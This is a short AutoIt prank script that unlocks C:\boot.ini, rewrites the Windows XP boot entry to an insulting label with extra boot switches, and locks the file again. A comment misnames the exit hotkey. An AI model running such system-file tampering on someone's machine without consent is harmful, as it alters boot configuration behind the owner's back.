 Press CONTROL-Q to terminate script 
HotKeySet("^q", "Terminate") 
 
AutoItSetOption ( "TrayIconDebug", 1 ) 
 
 
FileSetAttrib("C:\boot.ini", "-R") 
 
IniWrite("C:\boot.ini", "operating systems", "multi(0)disk(0)rdisk(0)partition(1)\WINDOWS", " ""Microsoft Windows XP Professional sucks"" /fastdetect /bootlog /sos /bootlogo /noguiboot") 
 
FileSetAttrib("C:\boot.ini", "+R") 
 
 
;This is the "terminate" function on the "Esc" hotkey 
Func Terminate() 
    Exit 0 
EndFunc 
 
;EOF

